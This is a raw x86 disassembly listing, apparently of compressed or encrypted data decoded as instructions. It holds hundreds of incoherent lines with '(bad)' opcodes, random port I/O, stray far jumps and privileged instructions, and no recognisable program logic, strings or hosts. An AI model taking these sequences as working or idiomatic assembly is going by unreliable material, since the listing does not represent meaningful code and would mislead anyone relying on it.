  42b519:	mov    al,ds:0x179390b0
  42b51e:	xor    dh,BYTE PTR [ecx-0x6682b1ed]
  42b524:	dec    edx
  42b525:	add    eax,0x806dd0f4
  42b52a:	and    DWORD PTR [edx],esi
  42b52c:	and    BYTE PTR [ecx+0x26],0x88
  42b530:	adc    ecx,edi
  42b532:	jle    0x42b57f
  42b534:	inc    eax
  42b535:	or     DWORD PTR [ebx-0x5a149989],0x5b
  42b53c:	iret   
  42b53d:	xor    eax,0x54cd367b
  42b542:	adc    ecx,DWORD PTR [esi-0x3b26df64]
  42b548:	xchg   ecx,eax
  42b549:	mov    bh,0x95
  42b54b:	cld    
  42b54c:	mov    ebp,0x8648b619
  42b551:	pop    ecx
  42b552:	xor    al,0x3f
  42b554:	repnz (bad)
  42b557:	fcmovnu st,st(6)
  42b559:	push   ds
  42b55a:	out    dx,eax
  42b55b:	cld    
  42b55c:	mov    dl,0x7f
  42b55e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b55f:	es les edi,FWORD PTR cs:[eax+eiz*8-0x43]
  42b565:	(bad)  [esp+esi*2]
  42b568:	dec    ebp
  42b569:	sqrtps xmm2,xmm4
  42b56c:	mov    edx,0x3b85fd11
  42b571:	arpl   di,sp
  42b573:	out    dx,al
  42b574:	push   edi
  42b575:	inc    ebx
  42b576:	outs   dx,BYTE PTR ds:[esi]
  42b577:	iret   
  42b578:	mov    ch,0x48
  42b57a:	dec    edi
  42b57b:	push   ebp
  42b57c:	popf   
  42b57d:	out    0x5b,eax
  42b57f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b580:	call   0x8402:0xfdeac63c
  42b587:	push   0xffffff84
  42b589:	fmul   QWORD PTR [ecx-0x5949f88c]
  42b58f:	dec    edx
  42b590:	sub    al,BYTE PTR [eax]
	...
  42b5f2:	add    BYTE PTR [eax],al
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	xchg   ebx,eax
  42b601:	ins    DWORD PTR es:[edi],dx
  42b602:	rcl    BYTE PTR [ebp+0x1d0be],cl
  42b608:	add    eax,0xd5000001
  42b60d:	inc    esi
  42b60e:	(bad)  
  42b60f:	fdiv   DWORD PTR [ebx+0x602c0e6f]
  42b615:	pop    ss
  42b616:	out    0xd6,eax
  42b618:	out    0x4d,eax
  42b61a:	sub    DWORD PTR [esp+0x2],edx
  42b61e:	cmp    al,0x77
  42b620:	sbb    DWORD PTR [ecx],ebp
  42b622:	push   ebx
  42b623:	and    ah,bh
  42b625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b626:	aaa    
  42b627:	test   BYTE PTR [ebx+0x5a],ch
  42b62a:	sub    edi,edx
  42b62c:	and    esi,esi
  42b62e:	loopne 0x42b5ee
  42b630:	dec    ecx
  42b631:	xchg   ebx,eax
  42b632:	das    
  42b633:	mov    ebx,DWORD PTR [esp+edx*1+0x7c]
  42b637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b638:	mov    ecx,0x6626b810
  42b63d:	mov    dl,0x1a
  42b63f:	popf   
  42b640:	dec    ebp
  42b641:	ja     0x42b5fa
  42b643:	lea    esi,[ebx]
  42b645:	mov    ds:0xeaba610d,eax
  42b64a:	mov    eax,ds:0xff3d8ec6
  42b64f:	dec    ebx
  42b650:	(bad)  
  42b651:	nop    DWORD PTR [ebx]
  42b654:	(bad)  
  42b655:	or     ebx,edi
  42b657:	push   ecx
  42b658:	inc    esi
  42b659:	add    ebp,ecx
  42b65b:	(bad)  
  42b65c:	fist   DWORD PTR [esi-0x6f45872c]
  42b662:	inc    ebp
  42b663:	jae    0x42b600
  42b665:	inc    eax
  42b666:	lea    esi,[ebp+0x22ec75fb]
  42b66c:	adc    ebx,DWORD PTR [esi-0x3c53de5b]
  42b672:	ds clc 
  42b674:	mov    edx,0xf717c782
  42b679:	add    edx,0x1b5d22ba
  42b67f:	push   0xc1367d29
  42b684:	inc    esp
  42b685:	xchg   ebp,eax
  42b686:	cmp    eax,DWORD PTR [ebx+edi*8-0x70]
  42b68a:	outs   dx,DWORD PTR ds:[esi]
  42b68b:	out    dx,al
  42b68c:	inc    esi
  42b68d:	repz push edi
  42b68f:	push   0xfffffff7
  42b691:	push   es
  42b692:	jbe    0x42b63e
  42b694:	jns    0x42b63c
  42b696:	mov    esi,0xaa28491
  42b69b:	mov    eax,ds:0xd73d32e1
  42b6a0:	leave  
  42b6a1:	sbb    edx,DWORD PTR [ecx]
  42b6a3:	fld    TBYTE PTR [edx-0x26b137ca]
  42b6a9:	inc    ecx
  42b6aa:	xchg   ecx,eax
  42b6ab:	das    
  42b6ac:	and    al,al
  42b6ae:	inc    ebx
  42b6af:	je     0x42b704
  42b6b1:	lods   eax,DWORD PTR ds:[esi]
  42b6b2:	nop
  42b6b3:	cli    
  42b6b4:	adc    BYTE PTR [edx-0x33],0x1c
  42b6b8:	ja     0x42b72d
  42b6ba:	mov    al,0x2d
  42b6bc:	and    cl,bl
  42b6be:	test   eax,0x802909f1
  42b6c3:	mov    edi,0xc50e44dc
  42b6c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b6c9:	fsubr  QWORD PTR [eax-0x4]
  42b6cc:	jnp    0x42b662
  42b6ce:	enter  0xb4f5,0x2d
  42b6d2:	adc    DWORD PTR [esi],edx
  42b6d4:	push   eax
  42b6d5:	in     eax,dx
  42b6d6:	mov    ecx,0xcd26a02b
  42b6db:	push   cs
  42b6dc:	sbb    BYTE PTR [eax+esi*8],ah
  42b6df:	pop    ds
  42b6e0:	mov    bh,0x39
  42b6e2:	loop   0x42b6b8
  42b6e4:	cdq    
  42b6e5:	push   ebp
  42b6e6:	cmp    al,BYTE PTR [eax]
  42b6e8:	pop    ecx
  42b6e9:	ins    BYTE PTR es:[edi],dx
  42b6ea:	or     eax,0xa073b2bd
  42b6ef:	xchg   ebx,eax
  42b6f0:	ss dec eax
  42b6f2:	aas    
  42b6f3:	enter  0x85cd,0xbf
  42b6f7:	lock add al,0x27
  42b6fa:	inc    edi
  42b6fb:	gs jne 0x42b741
  42b6fe:	dec    ebx
  42b6ff:	or     eax,0x2d5f4c17
  42b704:	pop    eax
  42b705:	or     dh,dl
  42b707:	adc    BYTE PTR [edi+0x2b],ah
  42b70a:	outs   dx,BYTE PTR ds:[esi]
  42b70b:	mov    esi,0x2f02498c
  42b710:	cdq    
	...
  42b771:	add    BYTE PTR [eax],al
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	jecxz  0x42b7ed
  42b782:	mov    ds:0x1d1c3cc,al
  42b787:	add    BYTE PTR ds:0xe000001,al
  42b78d:	ror    BYTE PTR [ebx-0x72],cl
  42b790:	push   ebx
  42b791:	pusha  
  42b792:	jmp    0x42b7ec
  42b794:	jp     0x42b781
  42b796:	xor    bh,bh
  42b798:	cmp    DWORD PTR [edi+0x72],edx
  42b79b:	cmp    BYTE PTR [ecx-0x37bf156b],ch
  42b7a1:	cmp    al,cl
  42b7a3:	fwait
  42b7a4:	loop   0x42b7e8
  42b7a6:	and    DWORD PTR [ebx+0x75],edx
  42b7a9:	stc    
  42b7aa:	jge    0x42b730
  42b7ac:	push   edx
  42b7ad:	std    
  42b7ae:	xchg   edx,eax
  42b7af:	push   0x2e790714
  42b7b4:	jmp    0x7f598d68
  42b7b9:	or     ebp,ebp
  42b7bb:	cmp    ebx,DWORD PTR [ebx+0x1b]
  42b7be:	xchg   esi,eax
  42b7bf:	sbb    al,0xd6
  42b7c1:	es add eax,0x69c17237
  42b7c7:	repz and bl,BYTE PTR [edx-0x4c9386bf]
  42b7ce:	psraw  mm1,QWORD PTR [ebx]
  42b7d1:	out    dx,eax
  42b7d2:	inc    ebx
  42b7d3:	mov    edi,0x7c0d25f6
  42b7d8:	popa   
  42b7d9:	mov    esi,0x962ac56d
  42b7de:	lods   al,BYTE PTR ds:[esi]
  42b7df:	push   0xbd87ad4d
  42b7e4:	daa    
  42b7e5:	ret    0x40e0
  42b7e8:	das    
  42b7e9:	inc    esi
  42b7ea:	daa    
  42b7eb:	iret   
  42b7ec:	sub    DWORD PTR [edi+0x56],esi
  42b7ef:	test   eax,0x951ffe10
  42b7f4:	or     eax,0xd3e5a1d9
  42b7f9:	push   ds
  42b7fa:	add    DWORD PTR [esi],esp
  42b7fc:	jbe    0x42b865
  42b7fe:	and    esp,DWORD PTR [edi-0x6dc7b5aa]
  42b804:	lahf   
  42b805:	stc    
  42b806:	sbb    edi,DWORD PTR [ecx-0x5d]
  42b809:	pusha  
  42b80a:	sub    eax,0xc96e37e3
  42b80f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b810:	jecxz  0x42b866
  42b812:	mov    cl,0x4c
  42b814:	pushf  
  42b815:	jmp    0xda37614c
  42b81a:	(bad)  
  42b81b:	jmp    0x14634ef2
  42b820:	mov    dl,0x78
  42b822:	in     al,0x4e
  42b824:	or     al,0xfd
  42b826:	clc    
  42b827:	jmp    0x5959:0x3a05f2f0
  42b82e:	inc    edi
  42b82f:	scas   al,BYTE PTR es:[edi]
  42b830:	cwde   
  42b831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b832:	repnz repnz xor eax,0xa3be7c24
  42b839:	not    BYTE PTR [eax+ebp*4+0x18]
  42b83d:	shl    BYTE PTR [ebx],0xd5
  42b840:	hlt    
  42b841:	outs   dx,DWORD PTR ds:[esi]
  42b842:	(bad)  
  42b843:	xlat   BYTE PTR ds:[ebx]
  42b844:	das    
  42b845:	add    al,0x63
  42b847:	sbb    ch,BYTE PTR [edi+0xa3de049]
  42b84d:	xchg   ecx,eax
  42b84e:	xchg   ecx,eax
  42b84f:	dec    esi
  42b850:	stos   DWORD PTR es:[edi],eax
  42b851:	leave  
  42b852:	pcmpeqw mm6,QWORD PTR [eax-0x74]
  42b856:	int3   
  42b857:	or     ebp,DWORD PTR ds:0x204acf7b
  42b85d:	(bad)  
  42b85e:	xlat   BYTE PTR ds:[ebx]
  42b85f:	imul   BYTE PTR [edx-0x697a15e4]
  42b865:	jecxz  0x42b82f
  42b867:	mov    edx,0xc4b036ac
  42b86d:	dec    ebp
  42b86e:	inc    esi
  42b86f:	adc    eax,0x1dc1d95d
  42b874:	adc    DWORD PTR [edi],esp
  42b876:	repnz or al,0x6a
  42b879:	(bad)  
  42b87a:	mov    ecx,0x3a5d49e6
  42b87f:	push   edi
  42b880:	ret    0x7252
  42b883:	retf   
  42b884:	out    dx,al
  42b885:	dec    esi
  42b886:	and    DWORD PTR [eax-0x3dfc7df1],ecx
  42b88c:	icebp  
  42b88d:	jmp    FWORD PTR [ebx]
  42b88f:	ret    0xdb
	...
  42b8f2:	add    BYTE PTR [eax],al
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ebx,edx
  42b901:	sahf   
  42b902:	mov    ah,0x95
  42b904:	enter  0x1d2,0x0
  42b908:	add    eax,0x1d000001
  42b90d:	dec    ebp
  42b90e:	sub    ch,BYTE PTR [ebp-0x68]
  42b911:	fst    QWORD PTR [esi-0x43fa46ec]
  42b917:	push   edx
  42b918:	imul   ecx,edi,0x23d8446e
  42b91e:	mov    al,0x7f
  42b920:	stos   DWORD PTR es:[edi],eax
  42b921:	push   eax
  42b922:	aam    0xae
  42b924:	retf   
  42b925:	call   0x2b71:0xff0477d1
  42b92c:	clc    
  42b92d:	mov    eax,ds:0x60170b92
  42b932:	mov    ebx,0x1603515f
  42b937:	jl     0x42b97e
  42b939:	or     ecx,DWORD PTR [eax]
  42b93b:	adc    eax,0xc649bd8d
  42b940:	cwde   
  42b941:	stos   BYTE PTR es:[edi],al
  42b942:	and    DWORD PTR [eax+0x70],edi
  42b945:	sbb    edx,DWORD PTR [ebx+0x33]
  42b948:	loop   0x42b92c
  42b94a:	pop    ss
  42b94b:	sbb    DWORD PTR [ebx+0xc],eax
  42b94e:	call   0x6b1c1c85
  42b953:	rcr    DWORD PTR [ebp+0x4b94c61b],cl
  42b959:	xlat   BYTE PTR ds:[ebx]
  42b95a:	(bad)  
  42b95b:	dec    edx
  42b95c:	repz adc ebx,DWORD PTR [eax+0x2b01b46f]
  42b963:	mov    ch,ch
  42b965:	(bad)  
  42b966:	enter  0xb42f,0xaa
  42b96a:	xchg   edx,eax
  42b96b:	mov    ebp,0x42bbdde2
  42b970:	mov    al,ds:0x682b7797
  42b975:	dec    ecx
  42b976:	jmp    0x42b97a
  42b978:	inc    esp
  42b979:	jnp    0x42b9c2
  42b97b:	ds stc 
  42b97d:	mov    eax,eax
  42b97f:	mov    WORD PTR [ebx+0x4074e352],fs
  42b985:	clc    
  42b986:	cmp    al,0x85
  42b988:	mov    ebx,0x7c3d164a
  42b98d:	scas   al,BYTE PTR es:[edi]
  42b98e:	cmp    BYTE PTR [eax-0x5d8365bd],dh
  42b994:	sbb    al,0x9d
  42b996:	loop   0x42ba01
  42b998:	loop   0x42b97f
  42b99a:	popf   
  42b99b:	jmp    0x46b15ad6
  42b9a0:	rcl    DWORD PTR [ecx+edi*2],1
  42b9a3:	xchg   ebx,eax
  42b9a4:	lock popf 
  42b9a6:	fadd   DWORD PTR [ebp-0x6c41c8e3]
  42b9ac:	cmc    
  42b9ad:	adc    BYTE PTR [esi],al
  42b9af:	(bad)  
  42b9b0:	mov    ecx,0x986d950c
  42b9b5:	push   cs
  42b9b6:	inc    esi
  42b9b7:	cmp    ah,bh
  42b9b9:	neg    DWORD PTR [edi]
  42b9bb:	sbb    ch,dh
  42b9bd:	pusha  
  42b9be:	sti    
  42b9bf:	mov    fs,ecx
  42b9c1:	sub    eax,0x55a5ff62
  42b9c6:	push   edx
  42b9c7:	xchg   esp,eax
  42b9c8:	retf   0xd944
  42b9cb:	mov    eax,0x2b542894
  42b9d0:	jbe    0x42b9fe
  42b9d2:	mov    ebx,0xd4da4aaf
  42b9d7:	xchg   esp,eax
  42b9d8:	jb     0x42b9da
  42b9da:	scas   al,BYTE PTR es:[edi]
  42b9db:	push   0x0
  42b9dd:	inc    ebp
  42b9de:	jp     0x42b9ae
  42b9e0:	or     DWORD PTR [edi+eax*1],ecx
  42b9e3:	pusha  
  42b9e4:	ins    DWORD PTR es:[edi],dx
  42b9e5:	imul   esi,DWORD PTR [eax],0xc38a20e8
  42b9eb:	pop    ecx
  42b9ec:	jae    0x42b9e1
  42b9ee:	and    al,0x4d
  42b9f0:	daa    
  42b9f1:	push   ds
  42b9f2:	popa   
  42b9f3:	(bad)  
  42b9f4:	imul   ebp,DWORD PTR ds:0x11c2fca2,0x6
  42b9fb:	lods   eax,DWORD PTR ds:[esi]
  42b9fc:	cmp    DWORD PTR [ecx-0x79],eax
  42b9ff:	pusha  
  42ba00:	leave  
  42ba01:	push   esi
  42ba02:	sbb    al,0x4c
  42ba04:	lock xor ch,BYTE PTR [eax]
  42ba07:	ja     0x42ba84
  42ba09:	mov    dl,0x2d
  42ba0b:	loop   0x42ba4e
  42ba0d:	or     DWORD PTR [eax+0x67],0x22
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [ebp-0x4d],ebx
  42ba82:	add    BYTE PTR [ebp+ecx*8+0x50001d3],dl
  42ba89:	add    DWORD PTR [eax],eax
  42ba8b:	add    BYTE PTR [ecx+0xb],cl
  42ba8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ba8f:	les    edx,FWORD PTR [edi-0x449836a5]
  42ba95:	add    esp,DWORD PTR [edi]
  42ba97:	fisttp DWORD PTR [ecx]
  42ba99:	lock lea esp,ds:0xc0a8b7d9
  42baa0:	sbb    eax,0xa16ceb02
  42baa5:	in     al,0x74
  42baa7:	sub    bh,bl
  42baa9:	pop    ebx
  42baaa:	jmp    0x349c8bf1
  42baaf:	ror    BYTE PTR [eax],cl
  42bab1:	cmp    eax,0xbd390e48
  42bab6:	jnp    0x42ba6e
  42bab8:	sti    
  42bab9:	imul   ebx,DWORD PTR [edi-0x18],0xf94a3a1b
  42bac0:	mov    dl,0x57
  42bac2:	add    eax,0xa685190c
  42bac7:	sbb    eax,0x4fbb627c
  42bacc:	arpl   WORD PTR [edi],dx
  42bace:	pop    esi
  42bacf:	pop    ecx
  42bad0:	(bad)  
  42bad1:	mov    edx,0xe90e0435
  42bad6:	sub    ah,BYTE PTR [edi]
  42bad8:	adc    BYTE PTR [edx-0x24354147],cl
  42bade:	int3   
  42badf:	lock sub BYTE PTR ds:0xc78970a7,bh
  42bae6:	fimul  WORD PTR [ebx+0x56]
  42bae9:	pusha  
  42baea:	test   DWORD PTR [edx-0x5d70dbf3],ebx
  42baf0:	sub    DWORD PTR [edx],0xffffff99
  42baf3:	ret    0x1a4e
  42baf6:	pop    ecx
  42baf7:	xchg   esi,eax
  42baf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42baf9:	rcr    DWORD PTR [edx],0x64
  42bafc:	xchg   ecx,eax
  42bafd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bafe:	in     al,0xa6
  42bb00:	aaa    
  42bb01:	test   DWORD PTR [edx],0x22ef39bd
  42bb07:	push   es
  42bb08:	sti    
  42bb09:	retf   0x3b4b
  42bb0c:	ficom  WORD PTR [edx-0x79]
  42bb0f:	gs jmp 0x8a5cc1c3
  42bb15:	sub    DWORD PTR [ecx],eax
  42bb17:	push   ss
  42bb18:	(bad)  
  42bb19:	mov    DWORD PTR [ebx],0xf55f5c6b
  42bb1f:	inc    edi
  42bb20:	lock nop
  42bb22:	not    dh
  42bb24:	(bad)
  42bb27:	mov    al,ds:0xcb533e0f
  42bb2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb2d:	popa   
  42bb2e:	lea    edx,ds:0x1bd210f5
  42bb34:	cmp    ch,ah
  42bb36:	push   ds
  42bb37:	cli    
  42bb38:	dec    ebx
  42bb39:	dec    eax
  42bb3a:	cmp    edi,esi
  42bb3c:	mov    ecx,0x91efd65c
  42bb41:	stc    
  42bb42:	dec    esp
  42bb43:	jnp    0x42bb96
  42bb45:	push   esi
  42bb46:	jbe    0x42bb8f
  42bb48:	shr    ebx,cl
  42bb4a:	arpl   WORD PTR [ecx-0x2d454db5],bp
  42bb50:	ret    0xcb2f
  42bb53:	fcom   QWORD PTR [esi]
  42bb55:	mov    bh,0xee
  42bb57:	pop    ecx
  42bb58:	rcr    BYTE PTR [ebx],cl
  42bb5a:	call   0xcb5e:0xc2dbf331
  42bb61:	stos   DWORD PTR es:[edi],eax
  42bb62:	ja     0x42bb10
  42bb64:	adc    BYTE PTR [edx+edi*1-0xf],cl
  42bb68:	int3   
  42bb69:	lea    esi,[ebp-0x75d10dae]
  42bb6f:	test   eax,0xfe273e01
  42bb74:	sbb    al,0xa8
  42bb76:	pusha  
  42bb77:	cmp    eax,0xd623e0ce
  42bb7c:	stos   BYTE PTR es:[edi],al
  42bb7d:	sbb    ebp,eax
  42bb7f:	xchg   edx,eax
  42bb80:	adc    bl,BYTE PTR [edi+edx*1-0x28]
  42bb84:	aas    
  42bb85:	cmc    
  42bb86:	dec    esp
  42bb87:	dec    edi
  42bb88:	sub    DWORD PTR [ebx],ecx
  42bb8a:	inc    BYTE PTR [ecx+0x4c0af7be]
  42bb90:	cmp    al,0x0
	...
  42bbf2:	add    BYTE PTR [eax],al
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	inc    esi
  42bc01:	(bad)  
  42bc02:	fisub  WORD PTR [edi]
  42bc04:	rcl    ah,cl
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    eax,0xcf000001
  42bc0d:	and    al,0x93
  42bc0f:	mov    esi,0x4439a29e
  42bc14:	imul   edi,DWORD PTR [edi-0x502ace3a],0x4f
  42bc1b:	add    bh,cl
  42bc1d:	mov    edx,DWORD PTR ds:0x2451666a
  42bc23:	loop   0x42bbc5
  42bc25:	mov    eax,ds:0xf4ee67ba
  42bc2a:	test   eax,0x25c95d4e
  42bc2f:	cmc    
  42bc30:	lods   al,BYTE PTR ds:[esi]
  42bc31:	mov    bh,0x32
  42bc33:	mov    al,0x7f
  42bc35:	lahf   
  42bc36:	mov    BYTE PTR [ebx],dh
  42bc38:	dec    esp
  42bc39:	aam    0xf6
  42bc3b:	fcomp  QWORD PTR [eax-0x59]
  42bc3e:	cld    
  42bc3f:	pop    ss
  42bc40:	es push eax
  42bc42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc43:	aad    0x61
  42bc45:	pop    esp
  42bc46:	repz pop ebp
  42bc48:	out    dx,eax
  42bc49:	or     edx,DWORD PTR ds:0x9f28efe6
  42bc4f:	dec    esp
  42bc50:	jmp    0x42bc0c
  42bc52:	mov    esp,0x68429bd4
  42bc57:	xor    al,0x20
  42bc59:	sub    eax,0xa50a15c4
  42bc5e:	jno    0x42bc5f
  42bc60:	cmp    ah,BYTE PTR [ebx]
  42bc62:	or     dh,BYTE PTR [ebp-0x5d]
  42bc65:	ret    0xb6af
  42bc68:	cmp    ax,0x2337
  42bc6c:	xchg   BYTE PTR ds:0x7cdd2cf2,ch
  42bc72:	mov    edx,0x4d0ea1f7
  42bc77:	add    esp,edx
  42bc79:	add    BYTE PTR ss:[ecx],al
  42bc7c:	cli    
  42bc7d:	stc    
  42bc7e:	jbe    0x42bcd6
  42bc80:	mov    ecx,ebp
  42bc82:	stos   DWORD PTR es:[edi],eax
  42bc83:	dec    ebp
  42bc84:	push   0x6b
  42bc86:	out    dx,eax
  42bc87:	enter  0xd494,0x13
  42bc8b:	pop    ds
  42bc8c:	mov    DWORD PTR [edx],0x4b501ff9
  42bc92:	leave  
  42bc93:	add    edx,DWORD PTR [edi+edi*8]
  42bc96:	(bad)  
  42bc97:	addr16 iret 
  42bc99:	dec    edi
  42bc9a:	cmp    DWORD PTR [ecx+0x3e],0x5a
  42bc9e:	fs loop 0x42bc8a
  42bca1:	mov    ?,WORD PTR [edx-0xc0ab61c]
  42bca7:	call   0x85486792
  42bcac:	icebp  
  42bcad:	lea    eax,[edx]
  42bcaf:	add    al,0x80
  42bcb1:	fnsave [bp+di+0x31]
  42bcb5:	out    0xc3,eax
  42bcb7:	fiadd  DWORD PTR [esi-0x3c044a13]
  42bcbd:	mov    ah,0xc1
  42bcbf:	inc    ebx
  42bcc0:	mov    eax,ds:0xf961adaf
  42bcc5:	jnp    0x42bcf5
  42bcc7:	popf   
  42bcc8:	in     eax,dx
  42bcc9:	mov    DWORD PTR [ecx-0x49710dc5],esp
  42bccf:	cwde   
  42bcd0:	rcl    DWORD PTR [esi-0x3cbe217d],cl
  42bcd6:	push   0x3c
  42bcd8:	stc    
  42bcd9:	xor    BYTE PTR [ebp+eiz*4+0x5b],bl
  42bcdd:	mov    edi,ebp
  42bcdf:	lods   al,BYTE PTR ds:[esi]
  42bce0:	test   BYTE PTR [edx+ecx*4],cl
  42bce3:	ins    DWORD PTR es:[edi],dx
  42bce4:	jb     0x42bd5f
  42bce6:	adc    al,0x17
  42bce8:	adc    BYTE PTR [ecx+edx*2],dl
  42bceb:	mov    cl,0xa4
  42bced:	test   bh,bl
  42bcef:	adc    edx,ebp
  42bcf1:	retf   0x6eb5
  42bcf4:	jne    0x42bccd
  42bcf6:	aam    0x81
  42bcf8:	mov    ds:0xe17dd46f,eax
  42bcfd:	scas   eax,DWORD PTR es:[edi]
  42bcfe:	or     esp,DWORD PTR [edx-0x7af60643]
  42bd04:	aaa    
  42bd05:	dec    ecx
  42bd06:	push   es
  42bd07:	push   es
  42bd08:	les    esi,FWORD PTR [edx]
  42bd0a:	fwait
  42bd0b:	pop    ss
  42bd0c:	push   esp
  42bd0d:	test   eax,0x7d13eb
	...
  42bd72:	add    BYTE PTR [eax],al
  42bd74:	mov    al,0xb6
  42bd76:	pushf  
  42bd77:	adc    al,0x9e
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd59
  42bd81:	aam    0x4c
  42bd83:	sub    edi,edx
  42bd85:	aad    0x1
  42bd87:	add    BYTE PTR ds:0x7a000001,al
  42bd8d:	mov    dl,0x2e
  42bd8f:	dec    ecx
  42bd90:	sub    ebx,ebx
  42bd92:	cli    
  42bd93:	or     al,0xe2
  42bd95:	gs dec edx
  42bd97:	mov    dh,0x32
  42bd99:	pop    esi
  42bd9a:	push   0x5
  42bd9c:	jns    0x42bd51
  42bd9e:	sbb    DWORD PTR [ecx-0x565d8aa9],0xad00167b
  42bda8:	push   eax
  42bda9:	in     al,dx
  42bdaa:	addr16 xor al,0xff
  42bdad:	out    0xb7,al
  42bdaf:	rcr    DWORD PTR [edi+0x34],1
  42bdb2:	popa   
  42bdb3:	loope  0x42bdb7
  42bdb5:	imul   DWORD PTR ds:0xa56230ea
  42bdbb:	sub    BYTE PTR [eax],al
  42bdbd:	retf   0x13c0
  42bdc0:	push   edx
  42bdc1:	sti    
  42bdc2:	repnz jmp 0x7401:0xa9ba7e9f
  42bdca:	or     esp,DWORD PTR [edi-0x8]
  42bdcd:	or     al,0x29
  42bdcf:	div    BYTE PTR [edx]
  42bdd1:	and    al,0x8
  42bdd3:	xchg   DWORD PTR [edx+0x5210fdf4],ecx
  42bdd9:	das    
  42bdda:	jmp    0xa4138cd4
  42bddf:	stos   BYTE PTR es:[edi],al
  42bde0:	xchg   esp,eax
  42bde1:	imul   ebx,DWORD PTR [esi],0x43
  42bde4:	jge    0x42bdcf
  42bde6:	mov    ds:0xf9a06795,eax
  42bdeb:	fs inc ecx
  42bded:	addr16 and al,0xda
  42bdf0:	(bad)  
  42bdf1:	(bad)  [eax]
  42bdf3:	pop    ecx
  42bdf4:	pop    edi
  42bdf5:	push   esp
  42bdf6:	mov    al,ds:0xdafba242
  42bdfb:	sub    eax,0xc1765f2c
  42be00:	cmp    al,0x29
  42be02:	mov    ebp,0xfa582dc
  42be07:	add    ebp,DWORD PTR fs:[ecx]
  42be0a:	inc    ecx
  42be0b:	xchg   edx,eax
  42be0c:	outs   dx,BYTE PTR ds:[esi]
  42be0d:	and    bh,BYTE PTR [ecx-0x15cc70ce]
  42be13:	data16 (bad) 
  42be15:	arpl   si,sp
  42be17:	pop    es
  42be18:	scas   eax,DWORD PTR es:[edi]
  42be19:	pushf  
  42be1a:	mov    ?,WORD PTR [ebp-0x77]
  42be1d:	fdivr  QWORD PTR [eax]
  42be1f:	adc    edi,DWORD PTR [ebx+0x45]
  42be22:	inc    edi
  42be23:	push   ebx
  42be24:	mov    eax,0x2560b57f
  42be29:	inc    edx
  42be2a:	adc    eax,0xe813305f
  42be2f:	call   0xb46b7ac
  42be34:	cdq    
  42be35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be36:	xchg   BYTE PTR [ecx+0x681066d7],ah
  42be3c:	jmp    DWORD PTR [esi-0x72]
  42be3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be40:	xor    edx,esi
  42be42:	sar    DWORD PTR [esi+0x5bf3121a],0x9f
  42be49:	loopne 0x42beca
  42be4b:	sub    eax,0x17af8097
  42be50:	push   ds
  42be51:	push   ecx
  42be52:	mov    gs,WORD PTR ds:0x7057e197
  42be58:	retf   0x95a6
  42be5b:	pushf  
  42be5c:	push   ebx
  42be5d:	push   edx
  42be5e:	sbb    eax,0xdae0d69c
  42be63:	in     eax,0x83
  42be65:	inc    ebp
  42be66:	test   DWORD PTR [edi+eiz*4+0x4d],ebp
  42be6a:	inc    ecx
  42be6b:	es hlt 
  42be6d:	aas    
  42be6e:	sub    al,0x47
  42be70:	mov    esp,0xf694f4f4
  42be75:	aaa    
  42be76:	xchg   DWORD PTR [ecx+0x58e7bc1b],edi
  42be7c:	addr16 out 0xc1,eax
  42be7f:	cmp    BYTE PTR [ebx-0x22],0x29
  42be83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be84:	inc    edi
  42be85:	push   cs
  42be86:	das    
  42be87:	vpsadbw ymm1,ymm4,ymm3
  42be8b:	xor    cl,cl
  42be8d:	jne    0x42beed
  42be8f:	lds    ebx,FWORD PTR [esi+0x0]
	...
  42bef2:	add    BYTE PTR [eax],al
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0x8b7bd7c8,eax
  42bf01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf02:	xchg   esp,eax
  42bf03:	retf   0xd6dc
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    eax,0xe8000001
  42bf0d:	mov    edi,0x49180136
  42bf12:	push   0x9
  42bf14:	daa    
  42bf15:	ret    
  42bf16:	xor    BYTE PTR [edi+0x1f],al
  42bf19:	xlat   BYTE PTR ds:[ebx]
  42bf1a:	fmul   QWORD PTR [ebp+0xc]
  42bf1d:	push   cs
  42bf1e:	int    0xb8
  42bf20:	inc    edi
  42bf21:	jmp    0xb85c:0x39ebc977
